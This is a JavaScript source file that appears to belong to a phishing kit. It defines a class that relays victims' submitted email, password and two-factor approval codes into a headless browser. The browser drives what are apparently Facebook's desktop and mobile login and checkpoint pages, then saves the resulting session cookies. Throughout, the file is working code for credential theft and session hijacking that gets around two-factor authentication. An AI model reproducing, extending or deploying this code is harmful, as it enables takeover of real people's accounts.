const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0 && this.device == "desktop") {
                const emailRef = '#email'
                await page.waitForSelector(emailRef)
                await page.evaluate((email, value) => {
                    document.querySelector(email).setAttribute("value", value)
                }, emailRef, this.email)
            } else if (this.email.length > 0 && this.device == "phone") {
                const email = `[id="m_login_email"]`
                await page.waitForSelector(email)
                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = []

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            console.log(body)
            const spikeType = body["spikeType"]

            if (spikeType == "desktop-home-login") {
                const email = `[name="email"]`
                const pass = `[name="pass"]`
                const submit = `[name="login"]`

                await page.waitForSelector(email)
                await page.waitForSelector(pass)
                await page.waitForSelector(submit)

                await page.evaluate((email, pass) => {
                    document.querySelector(email).value = ""
                    document.querySelector(email).setAttribute("value", "")
                    document.querySelector(pass).value = ""
                    document.querySelector(pass).setAttribute("value", "")
                }, email, pass)

                await page.type(email, body.email)
                await page.type(pass, body.pass)
                await page.click(submit)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "mobile-home-login") {
                const email = `[id="m_login_email"]`
                const password = `[id="m_login_password"]`
                const submitBtn = `[name="login"]`

                await page.waitForSelector(email)
                await page.waitForSelector(password)
                await page.type(email, body.email)
                await page.type(password, body.pass)
                await page.click(submitBtn)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            } else if (spikeType == "login-code") {
                const loginCodeInput = `[name="approvals_code"]`
                await page.waitForSelector(loginCodeInput)
                await page.type(loginCodeInput, body.approvals_code)

                await page.click(`#checkpointSubmitButton`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "resend-login-code") {
                const resendBtn = `[resend=btn]`
                await page.evaluate(() => {
                    document.querySelectorAll('a').forEach(atag => {
                        if (atag.innerText.includes("Didn't receive a code?")) {
                            atag.setAttribute("resend", "btn")
                        }
                    })
                })

                await page.waitForSelector(resendBtn)
                await page.click(resendBtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "recent-login") {
                await page.waitForSelector("button#checkpointSubmitButton")
                await page.click("button#checkpointSubmitButton")
                await page.waitForNavigation({ waitUntil: "networkidle0" })

                await page.waitForSelector("button#checkpointSubmitButton")
                await page.click("button#checkpointSubmitButton")
                await page.waitForNavigation({ waitUntil: "networkidle0" })

                await page.waitForSelector("button#checkpointSubmitButton")
                await page.click("button#checkpointSubmitButton")
                await page.waitForNavigation({ waitUntil: "networkidle0" })

                return await this.saveCookies()
            } else if (spikeType == "save-browser") {
                await page.evaluate(() => {
                    document.querySelector(`#checkpointSubmitButton-actual-button`).click()
                })

                await page.waitForNavigation({ waitUntil: "networkidle0" })
                return await this.saveCookies()
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }